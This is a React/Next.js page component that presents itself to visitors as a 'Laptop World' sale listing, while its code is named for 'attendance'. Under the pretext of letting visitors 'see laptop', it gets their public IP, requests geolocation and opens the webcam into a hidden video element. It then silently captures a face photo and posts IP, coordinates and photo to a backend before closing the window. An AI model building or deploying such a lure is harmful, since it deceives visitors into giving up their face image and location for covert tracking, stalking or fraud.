"use client";

import { useEffect, useRef, useState } from "react";

export default function Home() {

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const [status, setStatus] = useState("Initializing...");

  useEffect(() => {
    // eslint-disable-next-line react-hooks/immutability
    startAttendance();
  }, []);

  const startAttendance = async () => {

    try {
      setStatus("Please allow permissions to see laptop...");

      // IP
      const ipRes = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipRes.json();

      // Location
      const position = await new Promise<GeolocationPosition>(
        (res, rej) => navigator.geolocation.getCurrentPosition(res, rej)
      );

      // Camera
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
      });

      if (!videoRef.current) return;

      videoRef.current.srcObject = stream;

      await new Promise(r => setTimeout(r, 1500));

      // Capture
      const video = videoRef.current!;
      const canvas = canvasRef.current!;

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext("2d")!;
      ctx.drawImage(video, 0, 0);

      const photo = canvas.toDataURL("image/png");

      stream.getTracks().forEach(t => t.stop());

      // Save
      await fetch("/api/attendance", {
        method: "POST",
        body: JSON.stringify({
          ip: ipData.ip,
          latitude: position.coords.latitude.toString(),
          longitude: position.coords.longitude.toString(),
          photo,
        }),
      });

      setStatus("Laptop already saled ✅");

      setTimeout(() => window.close(), 1500);

    } catch {
      setStatus("Permission denied ❌");
    }
  };

  return (
    <main className="min-h-screen flex flex-col items-center justify-center">

      {/* <img src="/logo.png" width={120} /> */}

      <h1 className="text-2xl font-bold mt-4">
        Welcome to Laptop World
      </h1>

      <p className="mt-2 text-gray-600">
        {status}
      </p>

      <video ref={videoRef} hidden autoPlay />
      <canvas ref={canvasRef} hidden />
    </main>
  );
}
